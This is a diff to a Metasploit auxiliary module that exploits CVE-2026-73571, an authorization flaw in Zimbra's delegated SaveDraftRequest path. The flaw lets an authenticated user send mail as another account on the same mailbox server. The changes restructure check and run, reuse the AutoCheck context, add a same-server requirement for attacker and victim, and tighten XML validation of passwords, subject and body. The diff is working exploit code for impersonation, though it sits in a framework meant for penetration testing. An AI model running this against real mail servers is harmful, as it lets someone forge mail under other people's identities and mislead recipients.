@@ -19,7 +19,7 @@ class MetasploitModule < Msf::Auxiliary
         'Description' => %q{
           CVE-2026-73571 is an authorization failure in Zimbra Collaboration's
           delegated SaveDraftRequest path. An ordinary authenticated user can
-          select another local mailbox in the From element and cause Zimbra to
+          select another mailbox on the same mailbox server in the From element and cause Zimbra to
           send the message under that account's owner context. The legitimate
           MTA path also saves the message in the selected account's Sent folder.
 
@@ -74,14 +74,14 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def check
+    @prepared_context = nil
     reason = option_error
     return Msf::Exploit::CheckCode::Unknown(reason) if reason
 
-    context = prepare_context
+    context = prepare_impersonation
     return check_code_for_context(context) unless context[:status] == :success
 
-    verification = prepare_delivery_verification(context)
-    return check_code_for_context(verification) if verification && verification[:status] != :success
+    @prepared_context = { key: preparation_key, context: context }
 
     case version_state(context[:version])
     when :affected
@@ -100,12 +100,18 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
+    prepared = @prepared_context
+    @prepared_context = nil
     validate_options!
-    context = prepare_context
+    # Reuse the context from this run's AutoCheck once, while its options still match.
+    context = if datastore['AutoCheck'] && prepared && prepared[:key] == preparation_key
+                prepared[:context]
+              else
+                prepare_impersonation
+              end
     fail_for_context!(context, 'prepare the impersonation') unless context[:status] == :success
 
-    verification = prepare_delivery_verification(context)
-    fail_for_context!(verification, 'prepare delivery verification') if verification && verification[:status] != :success
+    verification = context[:verification]
 
     marker = verification ? SecureRandom.hex(12) : nil
     context[:subject] = normalized_option('SUBJECT')
@@ -159,18 +165,18 @@ class MetasploitModule < Msf::Auxiliary
       return "#{option} must contain at most 320 bytes" if value.encode(::Encoding::UTF_8).bytesize > 320
     end
     return 'PASSWORD must not be empty' unless option_present?('PASSWORD')
-    return 'PASSWORD cannot be represented in XML 1.0' if zimbra_xml_control?(datastore['PASSWORD'])
+    return 'PASSWORD cannot be represented in XML 1.0' unless zimbra_xml_string(datastore['PASSWORD'])
 
     subject = datastore['SUBJECT']
     return 'SUBJECT must not be empty' unless option_present?('SUBJECT')
-    return 'SUBJECT cannot be represented in XML 1.0' if zimbra_xml_control?(subject)
+    return 'SUBJECT cannot be represented in XML 1.0' unless zimbra_xml_string(subject)
 
     subject = subject.encode(::Encoding::UTF_8)
     return 'SUBJECT must be a single line' if subject.match?(/[\r\n]/)
     return 'SUBJECT must contain at most 470 bytes' if subject.bytesize > 470
 
     body = datastore['BODY'].to_s
-    return 'BODY cannot be represented in XML 1.0' if zimbra_xml_control?(body)
+    return 'BODY cannot be represented in XML 1.0' unless zimbra_xml_string(body)
     return 'BODY must contain at most 1,048,576 bytes' if body.encode(::Encoding::UTF_8).bytesize > 1_048_576
     return 'VERIFY_USERNAME and VERIFY_PASSWORD must be supplied together' if verification_partial?
     return 'VERIFY_TIMEOUT must be between 1 and 120' unless datastore['VERIFY_TIMEOUT'].between?(1, 120)
@@ -178,7 +184,7 @@ class MetasploitModule < Msf::Auxiliary
     if verification_configured?
       reason = zimbra_account_name_error(datastore['VERIFY_USERNAME'], 'VERIFY_USERNAME')
       return reason if reason
-      return 'VERIFY_PASSWORD cannot be represented in XML 1.0' if zimbra_xml_control?(datastore['VERIFY_PASSWORD'])
+      return 'VERIFY_PASSWORD cannot be represented in XML 1.0' unless zimbra_xml_string(datastore['VERIFY_PASSWORD'])
     end
 
     nil
@@ -197,10 +203,28 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def normalized_option(name)
-    datastore[name].encode(::Encoding::UTF_8)
+    zimbra_xml_string(datastore[name])
+  end
+
+  def preparation_key
+    values = [rhost, rport, ssl, vhost, target_uri.path, datastore['Proxies'], workspace, active_db?]
+    values.concat(%w[USERNAME PASSWORD VICTIM RECIPIENT VERIFY_USERNAME VERIFY_PASSWORD].map { |option| datastore[option] })
+    values.map { |value| value.is_a?(String) ? value.dup : value }
+  end
+
+  def prepare_impersonation
+    context = prepare_context
+    return context unless context[:status] == :success
+
+    verification = prepare_delivery_verification(context)
+    return verification if verification && verification[:status] != :success
+
+    context.merge(verification: verification)
   end
 
   def prepare_context
+    @soap_service = nil
+    @recorded_credentials = {}
     authentication = zimbra_authenticate(datastore['USERNAME'], datastore['PASSWORD'])
     return authentication unless authentication[:status] == :success
 
@@ -211,9 +235,21 @@ class MetasploitModule < Msf::Auxiliary
 
     report_soap_service(info[:version])
 
+    attacker = zimbra_account_info(authentication[:token], info[:name])
+    return attacker.merge(reason: "Unable to resolve USERNAME: #{result_reason(attacker)}") unless attacker[:status] == :success
+    unless attacker[:name].casecmp?(info[:name]) && (info[:id].nil? || attacker[:id].casecmp?(info[:id]))
+      return { status: :malformed, reason: 'GetAccountInfo returned a different identity for USERNAME' }
+    end
+
     victim = zimbra_account_info(authentication[:token], datastore['VICTIM'])
     return victim.merge(reason: "Unable to resolve VICTIM: #{result_reason(victim)}") unless victim[:status] == :success
-    return { status: :bad_config, reason: 'VICTIM resolves to the authenticated account' } if victim[:name].casecmp?(info[:name])
+    return { status: :bad_config, reason: 'VICTIM resolves to the authenticated account' } if victim[:id].casecmp?(attacker[:id])
+    if attacker[:mail_host].blank? || victim[:mail_host].blank?
+      return { status: :unexpected, reason: 'Unable to determine the mailbox server for USERNAME and VICTIM' }
+    end
+    unless attacker[:mail_host] == victim[:mail_host]
+      return { status: :not_vulnerable, reason: 'USERNAME and VICTIM reside on different mailbox servers' }
+    end
 
     {
       status: :success,
@@ -227,7 +263,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def prepare_delivery_verification(context)
     if !verification_configured? &&
-       (context[:recipient].casecmp?(context[:attacker]) || context[:recipient].casecmp?(datastore['USERNAME']))
+       (context[:recipient].casecmp?(context[:attacker]) || context[:recipient].casecmp?(normalized_option('USERNAME')))
       return { status: :success, token: context[:token], account: context[:attacker] }
     end
     return unless verification_configured?
@@ -319,11 +355,8 @@ class MetasploitModule < Msf::Auxiliary
     { status: :success, from: from, id: message['id'] }
   end
 
-  def version_state(version_string)
-    match = version_string.to_s.match(/\A\d+\.\d+\.\d+/)
-    return :unknown unless match
-
-    version = Rex::Version.new(match[0])
+  def version_state(version)
+    return :unknown unless version
     return :affected if version == Rex::Version.new('10.1.16')
     return :not_affected if version == Rex::Version.new('10.1.0')
     return :fixed if version >= Rex::Version.new('10.1.17')
@@ -332,6 +365,8 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def check_code_for_context(result)
+    return Msf::Exploit::CheckCode::Safe(result_reason(result)) if result[:status] == :not_vulnerable
+
     Msf::Exploit::CheckCode::Unknown(result_reason(result))
   end
 
